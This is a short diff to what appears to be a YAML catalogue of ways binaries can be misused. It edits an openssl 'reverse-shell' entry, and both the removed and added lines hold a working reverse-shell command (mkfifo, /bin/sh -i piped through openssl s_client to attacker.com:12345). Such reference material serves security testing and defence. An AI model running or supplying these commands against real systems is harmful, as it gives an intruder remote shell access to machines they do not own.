@@ -37,7 +37,8 @@ functions:
       unprivileged:
   reverse-shell:
   - code: |-
-      mkfifo /tmp/s; /bin/sh -i </tmp/s 2>&1 | openssl s_client -quiet -connect attacker.com:12345 >/tmp/s; rm /tmp/s
+      mkfifo /path/to/temp-socket
+      /bin/sh -i </path/to/temp-socket 2>&1 | openssl s_client -quiet -connect attacker.com:12345 >/path/to/temp-socket
     comment: |-
       The shell process is not spawn by `openssl`.
     contexts:
